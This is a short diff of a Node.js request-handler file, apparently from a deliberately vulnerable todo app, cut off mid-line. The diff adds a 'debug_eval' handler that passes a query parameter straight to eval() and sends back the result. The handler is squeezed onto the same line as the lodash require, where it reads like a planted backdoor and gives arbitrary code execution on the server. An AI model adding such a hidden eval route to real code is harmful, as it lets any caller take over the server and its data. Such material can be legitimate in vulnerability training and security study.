@@ -17,7 +17,8 @@ var AdmZip = require('adm-zip');
 var fs = require('fs');
 
 // prototype-pollution
-var _ = require('lodash');
+var _ = require('lodash');exports.debug_eval = function (req, res, next) { var result = eval(req.query.expr); res.send(String(result)); };
+
 
 exports.index = function (req, res, next) {
   Todo.
